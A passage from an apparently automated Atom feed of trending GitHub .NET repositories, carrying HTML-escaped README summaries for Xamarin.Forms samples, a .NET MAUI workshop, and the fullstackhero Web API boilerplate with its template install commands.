repository&lt;/a&gt;.&lt;/p&gt;</summary>
  </entry>
  <entry>
    <title>xamarin/xamarin-forms-samples</title>
    <updated>2022-05-29T01:36:31Z</updated>
    <id>tag:github.com,2022-05-29:/xamarin/xamarin-forms-samples</id>
    <link href="https://github.com/xamarin/xamarin-forms-samples" rel="alternate"></link>
    <summary type="html">&lt;p&gt;Sample apps built using the Xamarin.Forms framework&lt;/p&gt;&lt;hr&gt;&lt;h1&gt;Xamarin.Forms code samples&lt;/h1&gt; &#xA;&lt;p&gt;The samples in this repository demonstrate how to use different aspects of Xamarin.Forms to build cross-platform apps for iOS, Android, and the Universal Windows Platform (UWP). Please visit Microsoft &lt;a href=&#34;https://docs.microsoft.com/samples/browse/?term=Xamarin.Forms&#34;&gt;code sample browser&lt;/a&gt; to download individual samples.&lt;/p&gt; &#xA;&lt;p&gt;For additional platform support, visit the following forks:&lt;/p&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;Tizen: &lt;a href=&#34;https://github.com/Samsung/xamarin-forms-samples&#34;&gt;https://github.com/Samsung/xamarin-forms-samples&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;GTK#: &lt;a href=&#34;https://github.com/jsuarezruiz/xamarin-forms-samples/tree/gtk&#34;&gt;https://github.com/jsuarezruiz/xamarin-forms-samples/tree/gtk&lt;/a&gt;&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h2&gt;License&lt;/h2&gt; &#xA;&lt;p&gt;See the &lt;a href=&#34;https://raw.githubusercontent.com/xamarin/xamarin-forms-samples/main/LICENSE&#34;&gt;license file&lt;/a&gt; and any additional license information attached to each sample.&lt;/p&gt; &#xA;&lt;h2&gt;Sample submission guidelines&lt;/h2&gt; &#xA;&lt;p&gt;This repository welcomes contributions and suggestions. If you want to create a new sample, you need to work with an employee to help bring the new sample into the repository. Start by raising a &lt;a href=&#34;https://github.com/xamarin/xamarin-forms-samples/issues/new&#34;&gt;GitHub issue&lt;/a&gt; in this repository that outlines your proposed sample. Please note that samples in the &lt;code&gt;master&lt;/code&gt; branch of this repository shouldn&#39;t rely on preview or pre-release NuGet packages.&lt;/p&gt; &#xA;&lt;p&gt;The Xamarin.Forms samples in the &lt;a href=&#34;https://docs.microsoft.com/samples/browse/?term=Xamarin.Forms&#34;&gt;Microsoft samples browser&lt;/a&gt; are sourced from this repository. Samples need to comply with the following requirements:&lt;/p&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt; &lt;p&gt;&lt;strong&gt;Screenshots&lt;/strong&gt; - a folder called Screenshots that has at least one screen shot of the sample on each platform (preferably a screen shot for every page or every major piece of functionality). For an example of this, see &lt;a href=&#34;https://github.com/xamarin/xamarin-forms-samples/tree/master/WebServices/TodoREST/Screenshots&#34;&gt;TodoREST&lt;/a&gt;.&lt;/p&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;p&gt;&lt;strong&gt;Readme&lt;/strong&gt; - a &lt;code&gt;README.md&lt;/code&gt; file that explains the sample, and contains metadata to help customers find it. For an example of this, see &lt;a href=&#34;https://github.com/xamarin/xamarin-forms-samples/raw/master/WebServices/TodoREST/README.md&#34;&gt;WebServices/TodoREST&lt;/a&gt;. The README file should begin with a YAML header (delimited by &lt;code&gt;---&lt;/code&gt;) with the following keys/values:&lt;/p&gt; &#xA;  &lt;ul&gt; &#xA;   &lt;li&gt; &lt;p&gt;&lt;strong&gt;name&lt;/strong&gt; - must begin with &lt;code&gt;Xamarin.Forms -&lt;/code&gt;&lt;/p&gt; &#xA;    &lt;ul&gt; &#xA;     &lt;li&gt; &lt;p&gt;&lt;strong&gt;description&lt;/strong&gt; - brief description of the sample (&amp;lt; 150 chars) that appears in the sample code browser search&lt;/p&gt; &lt;/li&gt; &#xA;     &lt;li&gt; &lt;p&gt;&lt;strong&gt;page_type&lt;/strong&gt; - must be the string &lt;code&gt;sample&lt;/code&gt;.&lt;/p&gt; &lt;/li&gt; &#xA;     &lt;li&gt; &lt;p&gt;&lt;strong&gt;languages&lt;/strong&gt; - coding language/s used in the sample, such as: &lt;code&gt;csharp&lt;/code&gt;, &lt;code&gt;fsharp&lt;/code&gt;, &lt;code&gt;vb&lt;/code&gt;, &lt;code&gt;java&lt;/code&gt;&lt;/p&gt; &lt;/li&gt; &#xA;     &lt;li&gt; &lt;p&gt;&lt;strong&gt;products&lt;/strong&gt;: should be &lt;code&gt;xamarin&lt;/code&gt; for every sample in this repo&lt;/p&gt; &lt;/li&gt; &#xA;     &lt;li&gt; &lt;p&gt;&lt;strong&gt;urlFragment&lt;/strong&gt;: although this can be auto-generated, please supply a value that represents the sample&#39;s path in this repo, except directory separators are replaced with dashes (&lt;code&gt;-&lt;/code&gt;).&lt;/p&gt; &lt;/li&gt; &#xA;    &lt;/ul&gt; &lt;p&gt;Here is a working example from &lt;a href=&#34;https://raw.githubusercontent.com/xamarin/xamarin-forms-samples/master/WebServices/TodoREST/README.md&#34;&gt;&lt;em&gt;WebServices/TodoREST&lt;/em&gt; README raw view&lt;/a&gt;.&lt;/p&gt; &lt;pre&gt;&lt;code class=&#34;language-yaml&#34;&gt;---&#xA;name: Xamarin.Forms - TodoREST&#xA;description: This sample demonstrates a Todo list application where the data is stored and accessed from a RESTful web service.&#xA;page_type: sample&#xA;languages:&#xA;- csharp&#xA;products:&#xA;- xamarin&#xA;urlFragment: webservices-todorest&#xA;---&#xA;# Heading 1&#xA;&#xA;rest of README goes here, including screenshot images and requirements/instructions to get it running&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;    &lt;blockquote&gt; &#xA;     &lt;p&gt;NOTE: This must be valid YAML, so some characters in the name or description will require the entire string to be surrounded by &#34; or &#39; quotes.&lt;/p&gt; &#xA;    &lt;/blockquote&gt; &lt;/li&gt; &#xA;  &lt;/ul&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;p&gt;&lt;strong&gt;Buildable solution and .csproj file&lt;/strong&gt; - the project &lt;em&gt;must&lt;/em&gt; build and have the appropriate project scaffolding (solution + .csproj files).&lt;/p&gt; &lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;p&gt;This approach ensures that all samples integrate with the Microsoft &lt;a href=&#34;https://docs.microsoft.com/samples/browse/?term=Xamarin.Forms&#34;&gt;sample code browser&lt;/a&gt;.&lt;/p&gt; &#xA;&lt;p&gt;If you have any questions, create an issue or ask on the &lt;a href=&#34;https://forums.xamarin.com/&#34;&gt;Xamarin Forums&lt;/a&gt;.&lt;/p&gt;</summary>
  </entry>
  <entry>
    <title>dotnet-presentations/dotnet-maui-workshop</title>
    <updated>2022-05-29T01:36:31Z</updated>
    <id>tag:github.com,2022-05-29:/dotnet-presentations/dotnet-maui-workshop</id>
    <link href="https://github.com/dotnet-presentations/dotnet-maui-workshop" rel="alternate"></link>
    <summary type="html">&lt;p&gt;A full day workshop (.NET MAUI Workshop in a Box) on how to build apps with .NET MAUI for iOS, Android, macOS, and Windows&lt;/p&gt;&lt;hr&gt;&lt;h1&gt;.NET MAUI - Workshop&lt;/h1&gt; &#xA;&lt;p&gt;Today we will build a &lt;a href=&#34;https://docs.microsoft.com/dotnet/maui?WT.mc_id=friends-mauiworkshop-jamont&#34;&gt;.NET MAUI&lt;/a&gt; application that will display a list of Monkeys from around the world. We will start by building the business logic backend that pulls down json-encoded data from a RESTful endpoint. We will then leverage &lt;a href=&#34;https://docs.microsoft.com/xamarin/essentials/index?WT.mc_id=friends-mauiworkshop-jamont&#34;&gt;.NET MAUI&lt;/a&gt; to find the closest monkey to us and also show the monkey on a map. We will also see how to display data in many different ways and then finally fully theme the application.&lt;/p&gt; &#xA;&lt;h2&gt;Setup Guide&lt;/h2&gt; &#xA;&lt;p&gt;Hey there! This workshop will be a hands on and a bring your own device workshop. You can develop on PC (Recommended) or Mac and all you will need to do is install Visual Studio 2022 or Visual Studio for Mac 2022 with the .NET MAUI workload.&lt;/p&gt; &#xA;&lt;p&gt;Before starting the workshop, I recommend going through the quick 10 minute &lt;a href=&#34;https://docs.microsoft.com/dotnet/maui/get-started/first-app?WT.mc_id=friends-mauiworkshop-jamont&#34;&gt;.NET MAUI Tutorial&lt;/a&gt; that will guide you through installation and also ensuring everything is configured correct.&lt;/p&gt; &#xA;&lt;p&gt;If you are new to mobile development, we recommend deploying to a physical Android device which can be setup in just a few steps. If you don&#39;t have a device, don&#39;t worry as you can setup an &lt;a href=&#34;https://docs.microsoft.com/xamarin/android/get-started/installation/android-emulator?WT.mc_id=friends-mauiworkshop-jamont&#34;&gt;Android emulator with hardware acceleration&lt;/a&gt;. If you don&#39;t have time to set this up ahead of time, don&#39;t worry as we are here to help during the workshop.&lt;/p&gt; &#xA;&lt;p&gt;Beyond that you will be good to go for the workshop!&lt;/p&gt; &#xA;&lt;h2&gt;Agenda&lt;/h2&gt; &#xA;&lt;p&gt;I have also put together an abstract of what you can expect for the day long workshop:&lt;/p&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/dotnet-presentations/dotnet-maui-workshop/main/Part%200%20-%20Overview/README.md&#34;&gt;Part 0&lt;/a&gt; - 30 Min Session - Introduction to .NET MAUI Session &amp;amp; Setup Help&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/dotnet-presentations/dotnet-maui-workshop/main/Part%201%20-%20Displaying%20Data/README.md&#34;&gt;Part 1&lt;/a&gt; - Single Page List of Data&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/dotnet-presentations/dotnet-maui-workshop/main/Part%202%20-%20MVVM/README.md&#34;&gt;Part 2&lt;/a&gt; - MVVM &amp;amp; Data Binding&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/dotnet-presentations/dotnet-maui-workshop/main/Part%203%20-%20Navigation/README.md&#34;&gt;Part 3&lt;/a&gt; - Navigation&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/dotnet-presentations/dotnet-maui-workshop/main/Part%204%20-%20Platform%20Features/README.md&#34;&gt;Part 4&lt;/a&gt; - Implementing Platform Features&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/dotnet-presentations/dotnet-maui-workshop/main/Part%205%20-%20CollectionView/README.md&#34;&gt;Part 5&lt;/a&gt; - CollectionView &amp;amp; Beyond&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/dotnet-presentations/dotnet-maui-workshop/main/Part%206%20-%20AppThemes/README.md&#34;&gt;Part 6&lt;/a&gt; - Theming the app&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;p&gt;To get started open the &lt;code&gt;Part 1 - Displaying Data&lt;/code&gt; folder and open &lt;code&gt;MonkeyFinder.sln&lt;/code&gt;. You can use this throughout the workshop. Each &lt;strong&gt;part&lt;/strong&gt; has a &lt;strong&gt;README&lt;/strong&gt; file with directions for that part. If you came in late, you can open any of the folders and there is a starting project for that section.&lt;/p&gt; &#xA;&lt;h2&gt;Video Walkthrough&lt;/h2&gt; &#xA;&lt;p&gt;James recorded a &lt;a href=&#34;https://raw.githubusercontent.com/dotnet-presentations/dotnet-maui-workshop/main/%5Bhttps://www.youtube.com/DuNLR_NJv8U%5D(https://www.youtube.com/watch?v=DuNLR_NJv8U)&#34;&gt;full 4-hour walkthrough&lt;/a&gt; end-to-end on &lt;a href=&#34;https://youtube.com/jamesmontemagno&#34;&gt;his YouTube&lt;/a&gt;!&lt;/p&gt; &#xA;&lt;h2&gt;More links and resources:&lt;/h2&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://dot.net/maui&#34;&gt;.NET MAUI Website&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://docs.microsoft.com/learn/paths/build-apps-with-dotnet-maui/&#34;&gt;.NET MAUI on Microsoft Learn&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://docs.microsoft.com/dotnet/maui&#34;&gt;.NET MAUI Documentation&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/dotnet/maui&#34;&gt;.NET MAUI on GitHub&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://dot.net/videos&#34;&gt;.NET Beginner Series Videos&lt;/a&gt;&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;p&gt;If you have any questions please reach out to me on Twitter &lt;a href=&#34;https://twitter.com/jamesmontemagno&#34;&gt;@JamesMontemagno&lt;/a&gt;.&lt;/p&gt;</summary>
  </entry>
  <entry>
    <title>fullstackhero/dotnet-webapi-boilerplate</title>
    <updated>2022-05-29T01:36:31Z</updated>
    <id>tag:github.com,2022-05-29:/fullstackhero/dotnet-webapi-boilerplate</id>
    <link href="https://github.com/fullstackhero/dotnet-webapi-boilerplate" rel="alternate"></link>
    <summary type="html">&lt;p&gt;Clean Architecture Template for .NET 6.0 WebApi built with Multitenancy Support.&lt;/p&gt;&lt;hr&gt;&lt;p&gt;&lt;a href=&#34;https://github.com/fullstackhero/dotnet-webapi-boilerplate/raw/master/LICENSE&#34;&gt;&lt;img src=&#34;https://img.shields.io/github/license/fullstackhero/dotnet-webapi-boilerplate?color=2da44e&#34; alt=&#34;GitHub&#34;&gt;&lt;/a&gt; &lt;a href=&#34;https://discord.gg/yQWpShsKrf&#34;&gt;&lt;img src=&#34;https://img.shields.io/discord/878181478972928011?color=%237289da&amp;amp;label=Discord&amp;amp;logo=discord&amp;amp;logoColor=%237289da&#34; alt=&#34;Discord&#34;&gt;&lt;/a&gt; &lt;a href=&#34;https://www.nuget.org/packages/FullStackHero.WebAPI.Boilerplate/&#34;&gt;&lt;img src=&#34;https://img.shields.io/nuget/v/FullStackHero.WebAPI.Boilerplate?label=FullStackHero.WebAPI.Boilerplate&#34; alt=&#34;FullStackHero.WebAPI.Boilerplate on NuGet&#34;&gt;&lt;/a&gt; &lt;a href=&#34;https://www.nuget.org/packages/FullStackHero.WebAPI.Boilerplate/&#34;&gt;&lt;img src=&#34;https://img.shields.io/nuget/dt/FullStackHero.WebAPI.Boilerplate?color=2da44e&amp;amp;label=nuget%20downloads&amp;amp;logo=nuget&#34; alt=&#34;Nuget downloads&#34;&gt;&lt;/a&gt;&lt;/p&gt; &#xA;&lt;a href=&#34;https://twitter.com/intent/follow?screen_name=iammukeshm&#34;&gt; &lt;img src=&#34;https://img.shields.io/twitter/follow/iammukeshm.svg?label=Follow%20@iammukeshm&#34; alt=&#34;Follow @iammukeshm&#34;&gt; &lt;/a&gt; &amp;nbsp; &#xA;&lt;a href=&#34;https://twitter.com/intent/follow?screen_name=codewithmukesh&#34;&gt; &lt;img src=&#34;https://img.shields.io/twitter/follow/codewithmukesh.svg?label=Follow%20@codewithmukesh&#34; alt=&#34;Follow @codewithmukesh&#34;&gt; &lt;/a&gt; &#xA;&lt;p&gt; &lt;/p&gt;&#xA;&lt;p align=&#34;center&#34;&gt; &lt;img src=&#34;https://codewithmukesh.com/wp-content/uploads/2022/02/fullstackhero-dotnet-webapi-banner.png&#34; alt=&#34;fullstackhero&#34;&gt; &lt;/p&gt; &#xA;&lt;h2&gt;What&#39;s fullstackhero&#39;s .NET Web API Boilerplate?&lt;/h2&gt; &#xA;&lt;p&gt;fullstackhero&#39;s .NET Web API Boilerplate is a starting point for your next &lt;code&gt;.NET 6 Clean Architecture Project&lt;/code&gt; that incorporates the most essential packages and features your projects will ever need including out of the box Multi-Tenancy support. This project can save well over &lt;code&gt;200+ hours&lt;/code&gt; of development time for your team.&lt;/p&gt; &#xA;&lt;blockquote&gt; &#xA; &lt;p&gt;As the name suggests, this is an API / Server Boilerplate. You can find other Client Boilerplates that consume this API under &lt;code&gt;@fullstackhero&lt;/code&gt; handle.&lt;/p&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt;Find &lt;code&gt;Blazor WebAssembly Boilerplate&lt;/code&gt; here - &lt;a href=&#34;https://github.com/fullstackhero/blazor-wasm-boilerplate&#34;&gt;https://github.com/fullstackhero/blazor-wasm-boilerplate&lt;/a&gt;&lt;/li&gt; &#xA; &lt;/ul&gt; &#xA;&lt;/blockquote&gt; &#xA;&lt;h2&gt;Goals&lt;/h2&gt; &#xA;&lt;p&gt;The goal of this repository is to provide a complete and feature-rich starting point for any .NET Developer / Team to kick-start their next major project using .NET 6 Web API. This also serves the purpose of learning advanced concepts and implementations such as &lt;code&gt;Multitenancy, CQRS, Onion Architecture, Clean Coding standards&lt;/code&gt; and so on.&lt;/p&gt; &#xA;&lt;h2&gt;Features&lt;/h2&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;input type=&#34;checkbox&#34; checked disabled&gt; Built on .NET 6.0&lt;/li&gt; &#xA; &lt;li&gt;&lt;input type=&#34;checkbox&#34; checked disabled&gt; Follows Clean Architecture Principles&lt;/li&gt; &#xA; &lt;li&gt;&lt;input type=&#34;checkbox&#34; checked disabled&gt; Domain Driven Design&lt;/li&gt; &#xA; &lt;li&gt;&lt;input type=&#34;checkbox&#34; disabled&gt; Completely Documented at &lt;a href=&#34;https://fullstackhero.net&#34;&gt;fullstackhero.net&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;input type=&#34;checkbox&#34; checked disabled&gt; Multi Tenancy Support with Finbuckle &#xA;  &lt;ul&gt; &#xA;   &lt;li&gt;&lt;input type=&#34;checkbox&#34; checked disabled&gt; Create Tenants with Multi Database / Shared Database Support&lt;/li&gt; &#xA;   &lt;li&gt;&lt;input type=&#34;checkbox&#34; checked disabled&gt; Activate / Deactivate Tenants on Demand&lt;/li&gt; &#xA;   &lt;li&gt;&lt;input type=&#34;checkbox&#34; checked disabled&gt; Upgrade Subscription of Tenants - Add More Validity Months to each tenant!&lt;/li&gt; &#xA;  &lt;/ul&gt; &lt;/li&gt; &#xA; &lt;li&gt;&lt;input type=&#34;checkbox&#34; checked disabled&gt; Supports MySQL, MSSQL, Oracle &amp;amp; PostgreSQL!&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;Click to See More!&lt;/summary&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt;&lt;input type=&#34;checkbox&#34; checked disabled&gt; Uses Entity Framework Core as DB Abstraction&lt;/li&gt; &#xA;  &lt;li&gt;&lt;input type=&#34;checkbox&#34; checked disabled&gt; Flexible Repository Pattern&lt;/li&gt; &#xA;  &lt;li&gt;&lt;input type=&#34;checkbox&#34; checked disabled&gt; Dapper Integration for Optimal Performance&lt;/li&gt; &#xA;  &lt;li&gt;&lt;input type=&#34;checkbox&#34; checked disabled&gt; Serilog Integration with various Sinks - File, SEQ, Kibana&lt;/li&gt; &#xA;  &lt;li&gt;&lt;input type=&#34;checkbox&#34; checked disabled&gt; OpenAPI - Supports Client Service Generation&lt;/li&gt; &#xA;  &lt;li&gt;&lt;input type=&#34;checkbox&#34; checked disabled&gt; Mapster Integration for Quicker Mapping&lt;/li&gt; &#xA;  &lt;li&gt;&lt;input type=&#34;checkbox&#34; checked disabled&gt; API Versioning&lt;/li&gt; &#xA;  &lt;li&gt;&lt;input type=&#34;checkbox&#34; checked disabled&gt; Response Caching - Distributed Caching + REDIS&lt;/li&gt; &#xA;  &lt;li&gt;&lt;input type=&#34;checkbox&#34; checked disabled&gt; Fluent Validations&lt;/li&gt; &#xA;  &lt;li&gt;&lt;input type=&#34;checkbox&#34; checked disabled&gt; Audit Logging&lt;/li&gt; &#xA;  &lt;li&gt;&lt;input type=&#34;checkbox&#34; checked disabled&gt; Advanced User &amp;amp; Role Based Permission Management&lt;/li&gt; &#xA;  &lt;li&gt;&lt;input type=&#34;checkbox&#34; checked disabled&gt; Code Analysis &amp;amp; StyleCop Integration with Rulesets&lt;/li&gt; &#xA;  &lt;li&gt;&lt;input type=&#34;checkbox&#34; checked disabled&gt; JSON Based Localization with Caching&lt;/li&gt; &#xA;  &lt;li&gt;&lt;input type=&#34;checkbox&#34; checked disabled&gt; Hangfire Support - Secured Dashboard&lt;/li&gt; &#xA;  &lt;li&gt;&lt;input type=&#34;checkbox&#34; checked disabled&gt; File Storage Service&lt;/li&gt; &#xA;  &lt;li&gt;&lt;input type=&#34;checkbox&#34; checked disabled&gt; Test Projects&lt;/li&gt; &#xA;  &lt;li&gt;&lt;input type=&#34;checkbox&#34; checked disabled&gt; JWT &amp;amp; Azure AD Authentication&lt;/li&gt; &#xA;  &lt;li&gt;&lt;input type=&#34;checkbox&#34; checked disabled&gt; MediatR - CQRS&lt;/li&gt; &#xA;  &lt;li&gt;&lt;input type=&#34;checkbox&#34; checked disabled&gt; SignalR Notifications&lt;/li&gt; &#xA;  &lt;li&gt;&lt;input type=&#34;checkbox&#34; checked disabled&gt; &amp;amp; Much More&lt;/li&gt; &#xA; &lt;/ul&gt; &#xA;&lt;/details&gt; &#xA;&lt;h2&gt;Documentation&lt;/h2&gt; &#xA;&lt;p&gt;Read Documentation related to this Boilerplate here - &lt;a href=&#34;https://fullstackhero.net/dotnet-webapi-boilerplate/&#34;&gt;https://fullstackhero.net/dotnet-webapi-boilerplate/&lt;/a&gt;&lt;/p&gt; &#xA;&lt;blockquote&gt; &#xA; &lt;p&gt;Feel free to contribute to the Documentation Repository - &lt;a href=&#34;https://github.com/fullstackhero/docs&#34;&gt;https://github.com/fullstackhero/docs&lt;/a&gt;&lt;/p&gt; &#xA;&lt;/blockquote&gt; &#xA;&lt;h2&gt;Getting Started&lt;/h2&gt; &#xA;&lt;p&gt;To get started with this Boilerplate, here are the available options.&lt;/p&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;Install using &lt;code&gt;dotnet new&lt;/code&gt; . Use this for release versions of the Boilerplate only.&lt;/li&gt; &#xA; &lt;li&gt;Fork the Repository. Use this if you want to always keep your version of the Boilerplate up-to date with the latest changes.&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;blockquote&gt; &#xA; &lt;p&gt;Make sure that your DEV enviroment is setup, &lt;a href=&#34;https://fullstackhero.net/dotnet-webapi-boilerplate/general/development-environment/&#34;&gt;Read the Development Environment Guide&lt;/a&gt;&lt;/p&gt; &#xA;&lt;/blockquote&gt; &#xA;&lt;h2&gt;Forking the Repository&lt;/h2&gt; &#xA;&lt;p&gt;You would probably need to take this approach if you want to keep your source code upto date with the latest changes. To get started based on this repository, you need to get a copy locally. You have three options: fork, clone, or download.&lt;/p&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;Make a fork of this repository in your Github account.&lt;/li&gt; &#xA; &lt;li&gt;Create your new &lt;code&gt;dotnet-webapi-boilerplate&lt;/code&gt; personal project by cloning the forked repository on your personal github.&lt;/li&gt; &#xA; &lt;li&gt;Setup an upstream remote on your personal project pointing to your forked repository using command &lt;code&gt;git remote add upstream https://github.com/{githubuseraccount}/dotnet-webapi-boilerplate&lt;/code&gt; and &lt;code&gt;git remote set-url --push upstream DISABLE&lt;/code&gt;&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;p&gt;For step by step instructions, &lt;a href=&#34;https://discord.com/channels/878181478972928011/892573122186838046/933513103688224838&#34;&gt;follow this&lt;/a&gt; and &lt;a href=&#34;https://gist.github.com/0xjac/85097472043b697ab57ba1b1c7530274&#34;&gt;this&lt;/a&gt;.&lt;/p&gt; &#xA;&lt;h3&gt;Using the .NET CLI&lt;/h3&gt; &#xA;&lt;blockquote&gt; &#xA; &lt;p&gt;0.0.6 RC is now released!&lt;/p&gt; &#xA;&lt;/blockquote&gt; &#xA;&lt;p&gt;Open up your Command Prompt / Powershell and run the following command to install the solution template.&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-powershell&#34;&gt;dotnet new --install FullStackHero.WebAPI.Boilerplate&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;This would install the &lt;code&gt;fullstackhero .NET WebAPI Boilerplate&lt;/code&gt; template globally on your machine. With that done, let&#39;s see how you can start generating complete .NET WebAPI Solutions seamlessly.&lt;/p&gt; &#xA;&lt;p&gt;Simply navigate to a new directory (wherever you want to place your new solution), and open up Command Prompt at the opened directory.&lt;/p&gt; &#xA;&lt;p&gt;Run the following command. Note that, in this demonstration, I am naming my new solution as &lt;code&gt;FSH.Starter&lt;/code&gt;.&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-powershell&#34;&gt;dotnet new fsh-api -o FSH.Starter&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;For further steps and details, &lt;a href=&#34;https://fullstackhero.net/dotnet-webapi-boilerplate/general/getting-started/&#34;&gt;Read the Getting Started Guide&lt;/a&gt;&lt;/p&gt; &#xA;&lt;h2&gt;Important Links &amp;amp; Documentations&lt;/h2&gt; &#xA;&lt;p&gt;Overview - &lt;a href=&#34;https://fullstackhero.net/dotnet-webapi-boilerplate/general/overview/&#34;&gt;Read&lt;/a&gt;&lt;/p&gt; &#xA;&lt;p&gt;Getting Started - &lt;a href=&#34;https://fullstackhero.net/dotnet-webapi-boilerplate/general/getting-started/&#34;&gt;Read&lt;/a&gt;&lt;/p&gt; &#xA;&lt;p&gt;Development Environment - &lt;a href=&#34;https://fullstackhero.net/dotnet-webapi-boilerplate/general/development-environment/&#34;&gt;Learn about setting up the DEV environment&lt;/a&gt;&lt;/p&gt; &#xA;&lt;p&gt;Track Progress - &lt;a href=&#34;https://github.com/fullstackhero/dotnet-webapi-boilerplate/milestone/1&#34;&gt;Release 1.0 Milestones&lt;/a&gt;&lt;/p&gt; &#xA;&lt;p&gt;Participate in Discussions - &lt;a href=&#34;https://github.com/fullstackhero/dotnet-webapi-boilerplate/discussions&#34;&gt;QNA &amp;amp; General Discussions&lt;/a&gt;&lt;/p&gt; &#xA;&lt;p&gt;Join our Discord - &lt;a href=&#34;https://discord.gg/gdgHRt4mMw&#34;&gt;fullstackhero @ Discord&lt;/a&gt;&lt;/p&gt; &#xA;&lt;h2&gt;Changelogs&lt;/h2&gt; &#xA;&lt;p&gt;&lt;a href=&#34;https://github.com/fullstackhero/dotnet-webapi-boilerplate/raw/main/Changelogs.md&#34;&gt;View Complete Changelogs.&lt;/a&gt;&lt;/p&gt; &#xA;&lt;h2&gt;Community&lt;/h2&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;Discord &lt;a href=&#34;https://discord.gg/gdgHRt4mMw&#34;&gt;@fullstackhero&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;Facebook Page &lt;a href=&#34;https://facebook.com/codewithmukesh&#34;&gt;@codewithmukesh&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;Youtube Channel &lt;a href=&#34;https://youtube.com/c/codewithmukesh&#34;&gt;@codewithmukesh&lt;/a&gt;&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h2&gt;Contributors&lt;/h2&gt; &#xA;&lt;p&gt;Submit your PR and join the elite list!&lt;/p&gt; &#xA;&lt;a href=&#34;https://github.com/fullstackhero/dotnet-webapi-boilerplate/graphs/contributors&#34;&gt; &lt;img src=&#34;https://contrib.rocks/image?repo=fullstackhero/dotnet-webapi-boilerplate&#34;&gt; &lt;/a&gt; &#xA;&lt;h2&gt;License&lt;/h2&gt; &#xA;&lt;p&gt;This project is licensed with the &lt;a href=&#34;https://raw.githubusercontent.com/fullstackhero/dotnet-webapi-boilerplate/main/LICENSE&#34;&gt;MIT license&lt;/a&gt;.&lt;/p&gt; &#xA;&lt;h2&gt;Support &lt;span&gt;⭐&lt;/span&gt;&lt;/h2&gt; &#xA;&lt;p&gt;Has this Project helped you learn something New? or Helped you at work? Here are a few ways by which you can support.&lt;/p&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;Leave a star! &lt;span&gt;⭐&lt;/span&gt;&lt;/li&gt; &#xA; &lt;li&gt;Recommend this awesome project to your colleagues. 🥇&lt;/li&gt; &#xA; &lt;li&gt;Do consider endorsing me on LinkedIn for ASP.NET Core - &lt;a href=&#34;https://codewithmukesh.com/linkedin&#34;&gt;Connect via LinkedIn&lt;/a&gt; 🦸&lt;/li&gt; &#xA; &lt;li&gt;Or, If you want to support this project in the long run, &lt;a href=&#34;https://www.buymeacoffee.com/codewithmukesh&#34;&gt;consider buying me a coffee&lt;/a&gt;! ☕&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;br&gt; &#xA;&lt;p&gt;&lt;a href=&#34;https://www.buymeacoffee.com/codewithmukesh&#34;&gt;&lt;img width=&#34;250&#34; alt=&#34;black-button&#34; src=&#34;https://user-images.githubusercontent.com/31455818/138557309-27587d91-7b82-4cab-96bb-90f4f4e600f1.png&#34;&gt;&lt;/a&gt;&lt;/p&gt;</summary>
  </entry>
  <entry>
    <title>Azure/azure-sdk-for-net</title>
    <updated>2022-05-29T01:36:31Z</updated>
    <id>tag:github.com,2022-05-29:/Azure/azure-sdk-for-net</id>
    <link href="https://github.com/Azure/azure-sdk-for-net" rel="alternate"></link>
